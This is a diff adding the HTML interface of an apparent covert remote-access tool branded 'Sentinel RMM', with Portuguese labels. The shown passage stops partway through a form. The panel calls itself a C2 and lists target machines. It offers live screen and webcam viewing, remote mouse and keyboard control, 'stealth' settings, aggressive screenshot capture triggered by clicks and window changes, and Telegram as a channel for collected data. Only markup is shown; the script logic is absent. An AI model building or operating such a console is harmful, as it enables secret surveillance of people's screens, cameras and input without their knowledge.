@@ -1,0 +1,1396 @@
+<!DOCTYPE html>
+<html lang="pt-pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sentinel RMM - Master Control</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap');
+        body { background-color: #050505; color: #e2e8f0; font-family: 'JetBrains Mono', monospace; overflow-x: hidden; }
+        .glass { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.05); }
+        @media (hover: hover) { .card-hover:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(2, 132, 199, 0.1); border-color: rgba(2, 132, 199, 0.3); } }
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #0f172a; }
+        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
+        .loader { border: 3px solid rgba(2, 132, 199, 0.2); border-top: 3px solid #0ea5e9; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .log-box { font-family: 'Consolas', monospace; white-space: pre-wrap; word-wrap: break-word; }
+        details summary::-webkit-details-marker { display:none; }
+        
+        /* Cursor dinâmico para o modo de controlo AnyDesk */
+        .cursor-crosshair { cursor: crosshair !important; }
+        
+        /* Sliders do menu de vídeo */
+        input[type=range] { -webkit-appearance: none; appearance: none; background: #1e293b; height: 6px; border-radius: 4px; }
+        input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; appearance: none; height: 16px; width: 16px; border-radius: 50%; background: #0ea5e9; cursor: pointer; }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col p-3 sm:p-4 md:p-8 relative selection:bg-sky-500/30">
+
+    <!-- SETUP SCREEN -->
+    <div id="setup-screen" class="flex flex-col items-center justify-center min-h-[85vh] w-full max-w-md mx-auto transition-opacity duration-500 px-2">
+        <div class="glass p-6 sm:p-8 rounded-2xl w-full shadow-2xl">
+            <h1 class="text-2xl sm:text-3xl font-bold text-sky-500 text-center mb-2 tracking-tighter">SENTINEL MASTER</h1>
+            <p class="text-xs text-gray-500 text-center mb-8 uppercase tracking-[0.2em]">Conectar ao C2</p>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs text-gray-400 mb-1">Firebase URL</label>
+                    <input type="text" id="fb-url" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-sky-400 focus:outline-none focus:border-sky-500 text-sm" placeholder="https://seu-projeto.firebaseio.com/">
+                </div>
+                <div>
+                    <label class="block text-xs text-gray-400 mb-1">Auth Secret</label>
+                    <input type="password" id="fb-secret" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-sky-400 focus:outline-none focus:border-sky-500 text-sm" placeholder="Chave secreta do banco">
+                </div>
+                <button onclick="connectFirebase()" class="w-full py-3 mt-4 rounded-xl bg-sky-600 hover:bg-sky-500 text-white font-bold transition-all shadow-[0_0_15px_rgba(2,132,199,0.3)] hover:shadow-[0_0_25px_rgba(2,132,199,0.5)] uppercase tracking-widest text-sm active:scale-95">
+                    Autenticar
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- TELA DE CRIAÇÃO DE SENHA -->
+    <div id="create-password-screen" class="hidden flex-col items-center justify-center min-h-[85vh] w-full max-w-md mx-auto transition-opacity duration-500 px-2">
+        <div class="glass p-6 sm:p-8 rounded-2xl w-full shadow-2xl">
+            <div class="flex justify-center mb-4">
+                <div class="w-14 h-14 sm:w-16 sm:h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-emerald-500 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
+                    <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+                </div>
+            </div>
+            <h1 class="text-lg sm:text-xl font-bold text-white text-center mb-2 tracking-widest uppercase">Configuração Inicial</h1>
+            <p class="text-xs text-gray-500 text-center mb-6">Crie uma Senha Mestra para aceder a este Painel Web.</p>
+            
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs text-gray-400 mb-1">Nova Senha Mestra Web:</label>
+                    <input type="password" id="new-web-password" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-emerald-400 focus:outline-none focus:border-emerald-500 text-center tracking-[0.5em] text-lg font-bold" placeholder="••••••••">
+                </div>
+                <div class="pt-2 border-t border-slate-800">
+                    <p class="text-[11px] sm:text-xs text-amber-500 font-bold mb-2">Recuperação via Telegram (Recomendado):</p>
+                    <input type="text" id="new-tg-token" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-white focus:outline-none focus:border-sky-500 text-xs mb-2" placeholder="Bot Token">
+                    <input type="text" id="new-tg-chat" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-white focus:outline-none focus:border-sky-500 text-xs mb-2" placeholder="Chat ID">
+                    <button type="button" onclick="testTelegramWeb('new-tg-token', 'new-tg-chat')" class="w-full py-2.5 rounded-lg bg-blue-900/40 hover:bg-blue-600 text-blue-400 hover:text-white text-[11px] sm:text-xs font-bold border border-blue-900/50 transition-colors active:scale-95">🧪 Testar Conexão Telegram</button>
+                </div>
+                <button onclick="saveNewWebPassword()" class="w-full py-3 mt-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold transition-all shadow-[0_0_15px_rgba(16,185,129,0.3)] hover:shadow-[0_0_25px_rgba(16,185,129,0.5)] uppercase tracking-widest text-sm active:scale-95">
+                    Guardar e Aceder
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- LOGIN SCREEN -->
+    <div id="login-screen" class="hidden flex-col items-center justify-center min-h-[85vh] w-full max-w-md mx-auto transition-opacity duration-500 px-2">
+        <div class="glass p-6 sm:p-8 rounded-2xl w-full shadow-2xl">
+            <div class="flex justify-center mb-4">
+                <div class="w-14 h-14 sm:w-16 sm:h-16 bg-slate-900 rounded-full border border-slate-700 flex items-center justify-center text-sky-500 shadow-[0_0_15px_rgba(2,132,199,0.2)]">
+                    <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                </div>
+            </div>
+            <h1 class="text-xl sm:text-2xl font-bold text-white text-center mb-2 tracking-widest uppercase">Acesso Restrito</h1>
+            <p class="text-xs text-gray-500 text-center mb-8">Insira a Senha Mestra Web</p>
+            
+            <div class="space-y-4">
+                <div>
+                    <input type="password" id="master-password" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-sky-400 focus:outline-none focus:border-sky-500 text-center tracking-[0.5em] text-lg font-bold" placeholder="••••••••" onkeypress="if(event.key === 'Enter') loginDashboard()">
+                </div>
+                <button onclick="loginDashboard()" class="w-full py-3 mt-4 rounded-xl bg-sky-600 hover:bg-sky-500 text-white font-bold transition-all shadow-[0_0_15px_rgba(2,132,199,0.3)] hover:shadow-[0_0_25px_rgba(2,132,199,0.5)] uppercase tracking-widest text-sm flex justify-center items-center gap-2 active:scale-95">
+                    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
+                    Desbloquear
+                </button>
+                <button id="btn-recover" onclick="recoverPassword()" class="w-full mt-2 text-[11px] sm:text-xs text-slate-500 hover:text-sky-400 transition-colors flex items-center justify-center gap-1 text-center">
+                    <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
+                    <span>Esqueceu a senha? Recuperar no Telegram</span>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN DASHBOARD -->
+    <div id="dashboard-screen" class="hidden w-full max-w-7xl mx-auto flex-col space-y-4 sm:space-y-6">
+        <header class="glass rounded-xl sm:rounded-2xl p-4 sm:p-6 flex flex-col md:flex-row justify-between items-center gap-4">
+            <div class="text-center md:text-left w-full md:w-auto">
+                <h1 class="text-xl sm:text-2xl font-bold text-sky-500 tracking-tighter">SENTINEL RMM</h1>
+                <p class="text-[10px] sm:text-xs text-gray-500 uppercase tracking-[0.2em]">Painel de Gestão Global</p>
+            </div>
+            
+            <div class="flex flex-wrap justify-center gap-2 sm:gap-4 items-center w-full md:w-auto">
+                <div class="flex flex-col items-center p-2 bg-slate-900 rounded-lg border border-slate-800 flex-1 sm:flex-none min-w-[70px]">
+                    <span class="text-[10px] sm:text-xs text-gray-500">Total</span>
+                    <span id="stat-total" class="text-base sm:text-lg font-bold text-white">0</span>
+                </div>
+                <div class="flex flex-col items-center p-2 bg-slate-900/50 rounded-lg border border-emerald-900/30 flex-1 sm:flex-none min-w-[70px]">
+                    <span class="text-[10px] sm:text-xs text-emerald-500">Online</span>
+                    <span id="stat-online" class="text-base sm:text-lg font-bold text-emerald-400">0</span>
+                </div>
+                <div class="flex flex-col items-center p-2 bg-slate-900/50 rounded-lg border border-rose-900/30 flex-1 sm:flex-none min-w-[70px]">
+                    <span class="text-[10px] sm:text-xs text-rose-500">Offline</span>
+                    <span id="stat-offline" class="text-base sm:text-lg font-bold text-rose-400">0</span>
+                </div>
+                
+                <div class="flex gap-1 sm:gap-2 ml-auto md:ml-2">
+                    <button onclick="openGlobalConfig()" class="p-2 text-gray-500 hover:text-emerald-500 transition-colors bg-slate-900/50 md:bg-transparent rounded-lg border border-slate-800 md:border-transparent" title="Configurações Web">
+                        <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06-.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+                    </button>
+                    
+                    <button onclick="lockPanel()" class="p-2 text-gray-500 hover:text-amber-500 transition-colors bg-slate-900/50 md:bg-transparent rounded-lg border border-slate-800 md:border-transparent" title="Bloquear Painel">
+                        <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
+                    </button>
+
+                    <button onclick="logout()" class="p-2 text-gray-500 hover:text-rose-500 transition-colors bg-slate-900/50 md:bg-transparent rounded-lg border border-slate-800 md:border-transparent" title="Desconectar Firebase">
+                        <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
+                    </button>
+                </div>
+            </div>
+        </header>
+
+        <div class="flex flex-col sm:flex-row justify-between items-start sm:items-center px-2 gap-3">
+            <h2 class="text-base sm:text-lg text-white font-bold">Máquinas Conectadas</h2>
+            <div class="flex items-center gap-3 w-full sm:w-auto justify-between sm:justify-end">
+                <span id="last-update" class="text-[10px] sm:text-xs text-gray-500">Atualizado: agora</span>
+                <div class="flex items-center gap-2">
+                    <div id="refresh-loader" class="loader hidden w-4 h-4 sm:w-5 sm:h-5"></div>
+                    <button onclick="fetchClients()" class="text-[10px] sm:text-xs bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-lg text-sky-400 border border-slate-700 transition-colors active:scale-95">Force Refresh</button>
+                </div>
+            </div>
+        </div>
+
+        <div id="machines-grid" class="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-4 sm:gap-6"></div>
+    </div>
+
+    <!-- ==================== MODAIS ==================== -->
+
+    <!-- MODAL DE LIVE STREAM -->
+    <div id="stream-modal" class="hidden fixed inset-0 bg-black/95 z-[60] flex flex-col p-0 sm:p-4 backdrop-blur-sm">
+        
+        <!-- HEADER DO MODAL -->
+        <div class="w-full flex justify-between items-center mb-0 sm:mb-4 shrink-0 px-3 py-3 sm:px-4 mt-2 sm:mt-0 bg-black/50 sm:bg-transparent absolute sm:relative top-0 z-50 pointer-events-none">
+            <h2 class="text-sm sm:text-xl text-emerald-400 font-bold uppercase tracking-widest flex items-center gap-2 truncate pr-2 shadow-black drop-shadow-md pointer-events-auto">
+                <div class="w-2 h-2 sm:w-3 sm:h-3 bg-red-500 rounded-full animate-pulse shadow-[0_0_8px_#ef4444] shrink-0"></div> 
+                <span class="truncate" id="stream-type-text">Painel de Visualização</span>
+            </h2>
+            <div class="flex gap-2 pointer-events-auto">
+                <!-- Botão Activar Interação (Rato) -->
+                <button id="btn-control-mode" onclick="toggleControlMode()" class="text-gray-300 hover:text-white transition-colors bg-slate-800/80 p-2 sm:p-2.5 rounded-lg border border-slate-700 active:scale-95 shrink-0" title="Ativar Controlo de Rato">
+                    <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M3 3l7.07 16.97 2.51-7.39 7.39-2.51L3 3z"></path><path d="M13 13l6 6"></path></svg>
+                </button>
+                
+                <!-- Botão Activar Interação (Teclado) -->
+                <button id="btn-keyboard-mode" onclick="toggleKeyboardMode()" class="text-gray-300 hover:text-white transition-colors bg-slate-800/80 p-2 sm:p-2.5 rounded-lg border border-slate-700 active:scale-95 shrink-0" title="Ativar Controlo de Teclado">
+                    <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M8 12h.01M12 12h.01M16 12h.01M7 16h10"></path></svg>
+                </button>
+
+                <!-- Botão Tela Cheia -->
+                <button onclick="toggleFullScreenStream()" class="text-gray-300 hover:text-white transition-colors bg-slate-800/80 p-2 sm:p-2.5 rounded-lg border border-slate-700 active:scale-95 shrink-0" title="Tela Cheia">
+                    <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M8 3H5a2 2 0 0 0-2 2v3m18 0V5a2 2 0 0 0-2-2h-3m0 18h3a2 2 0 0 0 2-2v-3M3 16v3a2 2 0 0 0 2 2h3"></path></svg>
+                </button>
+                
+                <button onclick="closeStreamModal()" class="text-gray-300 hover:text-white transition-colors bg-slate-800/80 p-2 sm:p-2.5 rounded-lg border border-slate-700 active:scale-95 shrink-0">
+                    <svg width="20" height="20" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
+                </button>
+            </div>
+        </div>
+        
+        <!-- CONTAINER DA IMAGEM -->
+        <div id="stream-container-inner" class="flex-1 w-full h-full bg-black sm:rounded-xl sm:border sm:border-slate-800 overflow-hidden flex items-center justify-center relative shadow-2xl min-h-0 touch-none select-none z-10 focus:outline-none" tabindex="0">
+            <p id="stream-status" class="absolute text-slate-500 z-10 font-mono text-xs sm:text-sm animate-pulse px-4 text-center pointer-events-none">A aguardar conexão com o alvo...</p>
+            <img id="live-stream-img" class="w-full h-full object-contain relative z-20 origin-center transition-transform duration-75 pointer-events-none" src="" alt="" draggable="false">
+        </div>
+
+        <!-- Feedback visual das teclas (Para evitar spam e confirmar ação) -->
+        <div id="key-feedback" class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 z-[70] text-white font-mono text-2xl sm:text-4xl font-bold bg-indigo-600/90 backdrop-blur-sm px-6 py-4 rounded-xl shadow-[0_5px_25px_rgba(79,70,229,0.5)] pointer-events-none transition-opacity duration-200 opacity-0 hidden"></div>
+
+        <!-- CONTROLES DE TRANSMISSÃO OVERLAY (RODAPÉ DO MODAL) -->
+        <div class="absolute bottom-6 sm:bottom-10 left-1/2 -translate-x-1/2 z-[70] flex flex-wrap justify-center gap-2 sm:gap-3 bg-slate-900/90 p-2 sm:p-3 rounded-2xl backdrop-blur-md border border-slate-700 shadow-2xl">
+            <button id="modal-btn-screen" class="bg-sky-600/80 hover:bg-sky-600 text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-sky-500/50 shadow-[0_0_10px_rgba(2,132,199,0.4)] flex items-center gap-2 active:scale-95">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                Ligar Tela HD
+            </button>
+            <button id="modal-btn-cam" class="bg-teal-900/80 hover:bg-teal-600 text-teal-300 hover:text-white px-4 py-2.5 rounded-xl text-[10px] sm:text-xs font-bold transition-all border border-teal-800/50 flex items-center gap-2 active:scale-95">
+                <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M23 7l-7 5 7 5V7z"></path><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                Ligar Câmera
+            </button>
+        </div>
+
+        <!-- MENU DE CONFIGURAÇÃO DE VÍDEO (ESTILO YOUTUBE) -->
+        <div class="absolute bottom-4 right-4 sm:bottom-8 sm:right-8 z-[70] flex justify-end">
+            <div class="relative">
+                <button onclick="document.getElementById('stream-settings-popup').classList.toggle('hidden')" class="text-gray-400 bg-slate-900/60 backdrop-blur-sm border border-slate-700/50 hover:bg-slate-800 hover:text-white p-2.5 sm:p-3 rounded-full transition-transform hover:rotate-90 shadow-lg active:scale-95" title="Definições de Qualidade">
+                    <svg width="24" height="24" class="sm:w-6 sm:h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06-.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"></path></svg>
+                </button>
+                
+                <!-- O Popup (Abre para cima) -->
+                <div id="stream-settings-popup" class="hidden absolute bottom-full right-0 mb-3 w-64 bg-slate-900/95 backdrop-blur-md border border-slate-700 rounded-xl p-4 shadow-[0_10px_30px_rgba(0,0,0,0.8)]">
+                    <div class="flex items-center gap-2 mb-4 border-b border-slate-800 pb-2">
+                        <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" class="text-sky-500" viewBox="0 0 24 24"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2" ry="2"></rect></svg>
+                        <h4 class="text-xs font-bold text-white uppercase tracking-wider">Ajuste de Vídeo</h4>
+                    </div>
+                    
+                    <label class="block text-[11px] text-gray-400 mb-2 flex justify-between">
+                        Qualidade da Imagem: <span id="stream-live-q-val" class="text-sky-400 font-bold">60</span>
+                    </label>
+                    <input type="range" id="stream-live-quality" min="1" max="100" value="60" class="w-full mb-4" oninput="document.getElementById('stream-live-q-val').innerText=this.value" onchange="updateStreamQuality()">
+                    
+                    <label class="block text-[11px] text-gray-400 mb-2 flex justify-between mt-1">
+                        Resolução do Ecrã: <span id="stream-live-r-val" class="text-emerald-400 font-bold">70%</span>
+                    </label>
+                    <input type="range" id="stream-live-resolution" min="10" max="100" value="70" class="w-full" style="accent-color: #10b981;" oninput="document.getElementById('stream-live-r-val').innerText=this.value+'%'" onchange="updateStreamQuality()">
+                    
+                    <p class="text-[9px] text-slate-500 mt-4 leading-tight italic">* O ajuste é enviado automaticamente para a máquina e aplicado em segundos.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE CONFIGURAÇÃO GLOBAL -->
+    <div id="global-config-modal" class="hidden fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-3 sm:p-4 backdrop-blur-sm">
+        <div class="glass p-5 sm:p-6 rounded-2xl w-full max-w-sm shadow-2xl border border-emerald-900/50">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-base sm:text-lg text-emerald-500 font-bold uppercase tracking-widest">Configurações Web</h2>
+                <button onclick="closeModal('global-config-modal')" class="text-gray-500 hover:text-white bg-slate-800/50 p-1.5 rounded-lg"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
+            </div>
+            <p class="text-[11px] sm:text-xs text-slate-400 mb-4">Altere o link ou a hashtag. Deixe as senhas em branco se não quiser mudar a senha mestra.</p>
+            <div class="space-y-4">
+                <div>
+                    <label class="block text-xs text-gray-400 mb-1">Hashtag de Emergência (Telegram):</label>
+                    <input type="text" id="admin-tg-hashtag" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-sky-400 font-bold focus:border-emerald-500 text-sm" placeholder="#C2_RECUPERACAO">
+                </div>
+                
+                <div>
+                    <label class="block text-[11px] sm:text-xs text-blue-400 mb-1 font-bold">Link do Painel Web (Para Telegram):</label>
+                    <input type="text" id="admin-panel-url" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-sky-400 focus:border-blue-500 text-sm" placeholder="Ex: https://meu-painel.vercel.app">
+                </div>
+
+                <div class="border-t border-slate-800 pt-3">
+                    <label class="block text-xs text-gray-400 mb-1">Nova Senha Mestra (Vazio = Manter):</label>
+                    <input type="password" id="admin-new-pw" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-emerald-400 font-bold tracking-[0.3em] text-center focus:border-emerald-500 text-base sm:text-lg">
+                </div>
+                <div class="border-t border-slate-800 pt-3">
+                    <label class="block text-[11px] sm:text-xs text-amber-500 mb-1 font-bold">Senha Atual (APENAS se for mudar a senha):</label>
+                    <input type="password" id="admin-current-pw" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-white focus:border-amber-500 text-sm">
+                </div>
+                <button onclick="updateGlobalAdminConfig()" class="w-full py-3 mt-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold transition-all shadow-[0_0_10px_rgba(16,185,129,0.3)] text-sm active:scale-95">Salvar Configurações</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONFIGURAÇÃO REMOTA DA MÁQUINA -->
+    <div id="config-modal" class="hidden fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-3 sm:p-4 backdrop-blur-sm">
+        <div class="glass p-4 sm:p-6 rounded-2xl w-full max-w-lg shadow-2xl max-h-[90vh] overflow-y-auto overflow-x-hidden flex flex-col">
+            <div class="flex justify-between items-center mb-3 shrink-0">
+                <h2 class="text-lg sm:text-xl text-sky-500 font-bold uppercase tracking-widest truncate pr-2">Injeção C2</h2>
+                <button onclick="closeModal('config-modal')" class="text-gray-500 hover:text-white bg-slate-800/50 p-1.5 rounded-lg shrink-0"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button>
+            </div>
+            <p id="config-target-name" class="text-[10px] sm:text-xs text-amber-500 mb-4 font-bold bg-amber-500/10 inline-block px-2 py-1 rounded truncate shrink-0">Alvo: N/A</p>
+            
+            <div class="space-y-3 text-sm text-gray-300 flex-1 overflow-y-auto pr-1">
+                
+                <div class="bg-slate-900/80 border border-slate-700 rounded-lg p-4 hidden">
+                    <input type="checkbox" id="mod_use_fb" checked>
+                    <input type="text" id="mod_fb_url">
+                    <input type="password" id="mod_fb_secret">
+                </div>
+
+                <!-- Seção Telegram -->
+                <div class="bg-slate-900/80 border border-slate-700 rounded-lg p-3 sm:p-4">
+                    <div class="flex justify-between items-center mb-3">
+                        <label class="relative inline-flex items-center cursor-pointer">
+                            <input type="checkbox" id="mod_use_tg" class="sr-only peer" checked>
+                            <div class="w-11 h-6 bg-red-500 peer-focus:outline-none rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-500"></div>
+                            <span class="ml-3 font-bold text-blue-400 text-xs sm:text-sm">Ativar Disco Telegram</span>
+                        </label>
+                    </div>
+                    <div class="space-y-2 border-t border-slate-800 pt-3">
+                        <input type="text" id="mod_tg_token" class="w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white focus:border-blue-500 text-xs" placeholder="Bot Token (Ex: 12345:ABCDE...)">
+                        <input type="text" id="mod_tg_chat" class="w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white focus:border-blue-500 text-xs" placeholder="Chat ID (Ex: -100123456)">
+                        <input type="text" id="mod_tg_kw" class="w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white focus:border-blue-500 text-xs mb-1" placeholder="Palavra p/ Desligar (Ex: /desligar)">
+                        
+                        <button type="button" onclick="testTelegramWeb('mod_tg_token', 'mod_tg_chat')" class="w-full py-2.5 rounded-lg bg-blue-900/40 hover:bg-blue-600 text-blue-400 hover:text-white text-[11px] sm:text-xs font-bold border border-blue-900/50 transition-colors active:scale-95">🧪 Testar Conexão Telegram</button>
+                    </div>
+                </div>
+
+                <!-- Seção 3: Sistema & Captura -->
+                <details class="bg-slate-900/80 border border-slate-700 rounded-lg p-3" open>
+                    <summary class="font-bold text-white cursor-pointer text-xs sm:text-sm">Definições Furtivas & Captura</summary>
+                    
+                    <div class="pt-3 grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
+                        
+                        <label class="flex flex-col col-span-1 sm:col-span-2">
+                            <span class="text-sky-400 font-semibold text-xs mb-1">Apelido/Nome da Máquina:</span>
+                            <input type="text" id="mod_custom_name" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs font-bold" placeholder="Ex: PC_DA_MARIA">
+                        </label>
+                        <div class="col-span-1 sm:col-span-2 border-b border-slate-800 my-0 sm:my-1"></div>
+                        
+                        <label class="flex flex-col">
+                            <span class="text-amber-400 font-semibold text-xs mb-1">Modo Captura Fotos:</span>
+                            <select id="mod_cap_mode" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white focus:border-amber-500 text-xs">
+                                <option value="events">Eventos (Cliques/Enter)</option>
+                                <option value="timer">Temporizador Fixo</option>
+                                <option value="window">Mudança de Janela</option>
+                                <option value="all">Agressivo (Todos)</option>
+                            </select>
+                        </label>
+                        <label class="flex flex-col">
+                            <span class="text-amber-400 font-semibold text-xs mb-1">Timer Fotos (seg):</span>
+                            <input type="number" id="mod_cap_interval" class="mt-1 w-full bg-slate-950 border border-slate-700 rounded p-2.5 text-white text-xs" placeholder="Apenas p/ Timer">
+                        </label>
+                        <div class="col-span-1 sm:col-span-2 border-b border-slate-800 my-0 sm:my-1"></div>
+
+                        <label class="flex flex-col col-span-1 sm:col-span-2">
+                            <span class="text-sky-400 font-semibold text-xs mb-1">Senha Local da Máquina (Acesso Físico):</span>
